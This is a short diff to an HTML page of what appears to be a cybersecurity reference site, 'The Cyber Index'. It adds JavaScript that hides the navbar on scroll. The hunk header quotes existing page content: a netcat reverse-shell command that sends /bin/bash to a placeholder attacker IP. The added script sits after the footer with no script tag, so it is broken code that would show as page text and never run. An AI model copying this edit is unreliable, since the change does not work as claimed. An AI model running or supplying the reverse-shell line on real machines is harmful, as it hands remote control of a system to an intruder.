@@ -279,6 +279,25 @@ nc -e /bin/bash attacker_ip 4444</code></pre>
     <footer>
         <p>&copy; 2024 The Cyber Index. All rights reserved.</p>
     </footer>
+        
+// JavaScript to hide navbar on scroll down and show on scroll up
+let lastScrollTop = 0;
+const navbar = document.querySelector('.navbar');
+
+window.addEventListener('scroll', function() {
+    let scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+
+    if (scrollTop > lastScrollTop) {
+        // Scroll down - hide navbar
+        navbar.style.top = "-60px"; // Adjust the height of your navbar
+    } else {
+        // Scroll up - show navbar
+        navbar.style.top = "0";
+    }
+
+    lastScrollTop = scrollTop;
+});
+
 
 </body>
 </html>
